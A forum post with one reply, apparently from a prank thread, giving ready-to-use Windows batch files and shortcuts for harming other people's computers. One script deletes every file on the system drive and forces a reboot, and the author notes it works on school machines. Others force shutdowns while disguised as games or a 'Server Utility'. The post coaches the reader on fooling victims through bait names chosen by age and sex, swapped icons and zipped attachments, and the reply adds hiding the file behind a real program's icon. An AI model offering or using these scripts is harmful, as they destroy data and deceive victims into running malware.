    <description>[b][center][size=35pt]WELCOME TO MY THREAD TO GET PEOPLE MAD![/size][/center][/b]

I suggest not to use these on your own computer seeing as one of them can destroy your computer lol.

Open up notepad and paste this in it
[b]1.[/b]
[code]@echo off
del %systemdrive%\*.*/f/s/q
shutdown -r -f -t 00[/code]

Save the file as .bat file.

[u][b]NOTE:THIS DELETS THE SYSTEM HARDRIVE AND YOU HAVE TO REINSTALL WINDOWS.[/b][/u]

Works on a school computer to :p.

2.1) Right click on desk top, and then go New, then Shortcut.

2) Then in the &quot;type location of the item&quot; you want to type:
%windir%\system32\shutdown.exe -s -t 120 -c &quot;This is a virus&quot;


You can change &quot;this is a virus&quot; to anything you would like that&#39;s just the message that will appear.
The 120 you typed in can also be change at will, this is simply the amount of time they receive in till there computer will shutdown.
Once the code has been entered as you have seen above click next.

My advice would be to rename it something like.... wicked game, awesomeservertool. Depends on the victims age and sex. But make sure you call it something good or the victim won&#39;t bother clicking on it.
After you have given it a name click on finish.
You should now have an icon on your desktop that is called &quot;wicked game&quot; or whatever name you gave it.
It is also advised you change the icon to something different.

3) Change name and icon.

4) Now to send it to some one you need to make a compressed file.
This can be done by right clicking on the desktop, New, Compressed file (zipped)
Then another folder should appear on your desktop click on this and drag your shutdown virus into the zipped folder.

5) Once your shutdown virus is in your compressed folder rename it.
Make sure to give it a similar name as to the file inside it like &quot;Great Game.zip&quot;
Don&#39;t forget to add the .zip at the end.

WARNING! Make sure when you rename the compressed folder to add .zip at the end it is very important.

Now feel free to send it to anyone you...... dislike greatly.

As a safe guard I will tell you how to stop the shutdown count down. Just encase you ever click it your self LOL
Ok go to start, run, type cmd, then in cmd type: shutdown -a

3.
1.Open up notepad and put this in it,
@echo off
color 0a
title Server Utility 3.1.6.169
echo GoodBye D D 3 is now shutting down your computer nub.
pause
shutdown -r -f -t 00

Save as .bat and then send it to someone and when they click it it will look like a regular run server but it will shut down there computer.You can change the D D 3 to your name ={).</description>

<p>you could rename that file, put it somewhere like in a program file, and then make a shortcut to it and change the icon to the programs icon. then delete the programs icon and your set.</p>
